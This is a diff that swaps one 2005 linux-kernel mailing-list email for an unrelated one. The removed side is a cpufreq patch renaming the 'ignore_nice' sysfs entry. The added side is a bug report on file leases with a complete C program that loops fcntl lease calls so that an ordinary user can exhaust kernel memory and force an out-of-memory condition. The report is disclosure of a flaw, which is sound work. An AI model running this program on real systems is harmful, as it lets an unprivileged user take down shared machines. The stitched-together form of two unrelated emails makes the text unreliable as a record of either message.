@@ -1,152 +1,83 @@
-Return-Path: <linux-kernel-owner+willy=40w.ods.org-S1751162AbVKJRBG@vger.kernel.org>
+Return-Path: <linux-kernel-owner+willy=40w.ods.org-S1750924AbVKJRAt@vger.kernel.org>
 Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
-	id S1751162AbVKJRBG (ORCPT <rfc822;willy@w.ods.org>);
-	Thu, 10 Nov 2005 12:01:06 -0500
-Received: (majordomo@vger.kernel.org) by vger.kernel.org id S1751168AbVKJRBF
+	id S1750924AbVKJRAt (ORCPT <rfc822;willy@w.ods.org>);
+	Thu, 10 Nov 2005 12:00:49 -0500
+Received: (majordomo@vger.kernel.org) by vger.kernel.org id S1750948AbVKJRAt
 	(ORCPT <rfc822;linux-kernel-outgoing>);
-	Thu, 10 Nov 2005 12:01:05 -0500
-Received: from mrelay2.soas.ac.uk ([212.219.139.201]:31408 "EHLO
-	mrelay2.soas.ac.uk") by vger.kernel.org with ESMTP id S1750948AbVKJRBD
+	Thu, 10 Nov 2005 12:00:49 -0500
+Received: from gateway.argo.co.il ([194.90.79.130]:15628 "EHLO
+	argo2k.argo.co.il") by vger.kernel.org with ESMTP id S1750899AbVKJRAs
 	(ORCPT <rfc822;linux-kernel@vger.kernel.org>);
-	Thu, 10 Nov 2005 12:01:03 -0500
-Date: Thu, 10 Nov 2005 17:00:40 +0000
-From: Alexander Clouter <alex@digriz.org.uk>
-To: akpm@osdl.org, linux-kernel@vger.kernel.org
-Cc: davej@redhat.com, davej@codemonkey.org.uk, blaisorblade@yahoo.it
-Subject: [patch 1/1] cpufreq_conservative/ondemand: invert meaning of 'ignore nice'
-Message-ID: <20051110170040.GE16994@inskipp.digriz.org.uk>
+	Thu, 10 Nov 2005 12:00:48 -0500
+Message-ID: <43737CBE.2030005@argo.co.il>
+Date: Thu, 10 Nov 2005 19:00:46 +0200
+From: Avi Kivity <avi@argo.co.il>
+User-Agent: Mozilla Thunderbird 1.0.7-1.1.fc4 (X11/20050929)
+X-Accept-Language: en-us, en
 MIME-Version: 1.0
-Content-Type: multipart/mixed; boundary="KlAEzMkarCnErv5Q"
-Content-Disposition: inline
-Organization: diGriz
-X-URL: http://www.digriz.org.uk/
-User-Agent: Mutt/1.5.11
+To: linux-kernel <linux-kernel@vger.kernel.org>
+Subject: local denial-of-service with file leases
+Content-Type: text/plain; charset=ISO-8859-1; format=flowed
+Content-Transfer-Encoding: 7bit
+X-OriginalArrivalTime: 10 Nov 2005 17:00:46.0936 (UTC) FILETIME=[4B730580:01C5E618]
 Sender: linux-kernel-owner@vger.kernel.org
 X-Mailing-List: linux-kernel@vger.kernel.org
 
+the following program will oom a the 2.6.14.1 kernel, running as an 
+ordinary user:
 
---KlAEzMkarCnErv5Q
-Content-Type: text/plain; charset=us-ascii
-Content-Disposition: inline
+#include <unistd.h>
 
-The use of the 'ignore_nice' sysfs file is confusing to anyone using it.
-This removes the sysfs file 'ignore_nice' and in its place creates a
-'ignore_nice_load' entry which defaults to '0'; meaning nice'd processes 
-*are* counted towards the 'business' caclulation.
+#include <stdlib.h>
 
-WARNING: this obvious breaks any userland tools that expected 'ignore_nice'
-to exist, to draw attention to this fact it was concluded on the mailing list
-that the entry should be removed altogether so the userland app breaks and so
-the author can build simple to detect workaround.  Having said that it seems
-currently very few tools even make use of this functionality; all I could
-find was a Gentoo Wiki entry.
+#include <linux/fcntl.h>
 
-Signed-off-by: Alexander Clouter <alex-kernel@digriz.org.uk>
+int main(int ac, char **av)
+
+{
+
+    char *fname = av[0];
+
+    int fd = open(fname, O_RDONLY);
+
+    int r;
+
+    
+
+    while (1) {
+
+        r = fcntl(fd, F_SETLEASE, F_RDLCK);
+
+        if (r == -1) {
+
+            perror("F_SETLEASE, F_RDLCK");
+
+            exit(1);
+
+        }
+
+        r = fcntl(fd, F_SETLEASE, F_UNLCK);
+
+        if (r == -1) {
+
+            perror("F_SETLEASE, F_UNLCK");
+
+            exit(1);
+
+        }
+
+    }
+
+    return 0;
+
+}
 
 
---KlAEzMkarCnErv5Q
-Content-Type: text/plain; charset=us-ascii
-Content-Disposition: attachment; filename="01_inverse_ignore_nice_flag.diff"
+it will suck all available memory into fasync_cache, causing an oom. a 
+workaround is to set fs.leases-enable to 0.
 
-diff -r -u -d linux-2.6.14-rc2.orig/drivers/cpufreq/cpufreq_conservative.c \
-                linux-2.6.14-rc2/drivers/cpufreq/cpufreq_conservative.c
---- linux-2.6.14-rc2.orig/drivers/cpufreq/cpufreq_conservative.c	2005-10-03 \
-                20:05:30.742334750 +0100
-+++ linux-2.6.14-rc2/drivers/cpufreq/cpufreq_conservative.c	2005-10-06 \
-21:10:47.785133750 +0100 @@ -93,7 +93,7 @@
- {
- 	return	kstat_cpu(cpu).cpustat.idle +
- 		kstat_cpu(cpu).cpustat.iowait +
--		( !dbs_tuners_ins.ignore_nice ? 
-+		( dbs_tuners_ins.ignore_nice ? 
- 		  kstat_cpu(cpu).cpustat.nice :
- 		  0);
- }
-@@ -127,7 +127,7 @@
- show_one(sampling_down_factor, sampling_down_factor);
- show_one(up_threshold, up_threshold);
- show_one(down_threshold, down_threshold);
--show_one(ignore_nice, ignore_nice);
-+show_one(ignore_nice_load, ignore_nice);
- show_one(freq_step, freq_step);
- 
- static ssize_t store_sampling_down_factor(struct cpufreq_policy *unused, 
-@@ -207,7 +207,7 @@
- 	return count;
- }
- 
--static ssize_t store_ignore_nice(struct cpufreq_policy *policy,
-+static ssize_t store_ignore_nice_load(struct cpufreq_policy *policy,
- 		const char *buf, size_t count)
- {
- 	unsigned int input;
-@@ -272,7 +272,7 @@
- define_one_rw(sampling_down_factor);
- define_one_rw(up_threshold);
- define_one_rw(down_threshold);
--define_one_rw(ignore_nice);
-+define_one_rw(ignore_nice_load);
- define_one_rw(freq_step);
- 
- static struct attribute * dbs_attributes[] = {
-@@ -282,7 +282,7 @@
- 	&sampling_down_factor.attr,
- 	&up_threshold.attr,
- 	&down_threshold.attr,
--	&ignore_nice.attr,
-+	&ignore_nice_load.attr,
- 	&freq_step.attr,
- 	NULL
- };
-diff -r -u -d linux-2.6.14-rc2.orig/drivers/cpufreq/cpufreq_ondemand.c \
-                linux-2.6.14-rc2/drivers/cpufreq/cpufreq_ondemand.c
---- linux-2.6.14-rc2.orig/drivers/cpufreq/cpufreq_ondemand.c	2005-10-03 \
-                20:05:30.742334750 +0100
-+++ linux-2.6.14-rc2/drivers/cpufreq/cpufreq_ondemand.c	2005-10-06 21:10:23.979646000 \
-+0100 @@ -86,7 +86,7 @@
- {
- 	return	kstat_cpu(cpu).cpustat.idle +
- 		kstat_cpu(cpu).cpustat.iowait +
--		( !dbs_tuners_ins.ignore_nice ? 
-+		( dbs_tuners_ins.ignore_nice ? 
- 		  kstat_cpu(cpu).cpustat.nice :
- 		  0);
- }
-@@ -119,7 +119,7 @@
- show_one(sampling_rate, sampling_rate);
- show_one(sampling_down_factor, sampling_down_factor);
- show_one(up_threshold, up_threshold);
--show_one(ignore_nice, ignore_nice);
-+show_one(ignore_nice_load, ignore_nice);
- 
- static ssize_t store_sampling_down_factor(struct cpufreq_policy *unused, 
- 		const char *buf, size_t count)
-@@ -179,7 +179,7 @@
- 	return count;
- }
- 
--static ssize_t store_ignore_nice(struct cpufreq_policy *policy,
-+static ssize_t store_ignore_load_tasks(struct cpufreq_policy *policy,
- 		const char *buf, size_t count)
- {
- 	unsigned int input;
-@@ -220,7 +220,7 @@
- define_one_rw(sampling_rate);
- define_one_rw(sampling_down_factor);
- define_one_rw(up_threshold);
--define_one_rw(ignore_nice);
-+define_one_rw(ignore_nice_load);
- 
- static struct attribute * dbs_attributes[] = {
- 	&sampling_rate_max.attr,
-@@ -228,7 +228,7 @@
- 	&sampling_rate.attr,
- 	&sampling_down_factor.attr,
- 	&up_threshold.attr,
--	&ignore_nice.attr,
-+	&ignore_nice_load.attr,
- 	NULL
- };
- 
+this has already been reported to lkml[1] and fedora[2], with no effect.
 
---KlAEzMkarCnErv5Q--
+[1] http://www.ussg.iu.edu/hypermail/linux/kernel/0510.2/1589.html
+[2] https://bugzilla.redhat.com/bugzilla/show_bug.cgi?id=172691
+
